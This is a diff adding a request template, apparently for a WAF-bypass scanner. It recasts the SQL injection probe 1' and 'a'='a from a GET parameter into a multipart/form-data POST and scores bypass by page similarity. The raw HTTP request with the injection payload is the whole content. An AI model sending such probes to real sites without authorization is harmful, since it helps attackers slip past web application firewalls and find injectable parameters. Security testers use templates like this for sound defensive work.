@@ -1,0 +1,22 @@
+# @name: POST Multipart探测
+# @tags: post,multipart,form-data,id,bypass
+# @color: purple
+# @colornote: cyan、blue、green、amber、orange、gold、pink、purple、violet、lavender、red、rose、teal、yellow、white、ice
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: get_param_to_multipart
+# @intent.param: id
+# @intent.payload: 1' and 'a'='a
+# @intent.content_type: multipart/form-data
+# @intent.boundary: ----WAFKillerBoundary7MA4YWxkTrZu0gW
+# @note: 将原本 /?id=1' and 'a'='a 的 GET 参数，改为 multipart/form-data 的 POST 请求，并按基线页面相似度判定是否可能绕过。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=----WAFKillerBoundary7MA4YWxkTrZu0gW
+
+------WAFKillerBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="id"
+
+1' and 'a'='a
+------WAFKillerBoundary7MA4YWxkTrZu0gW--
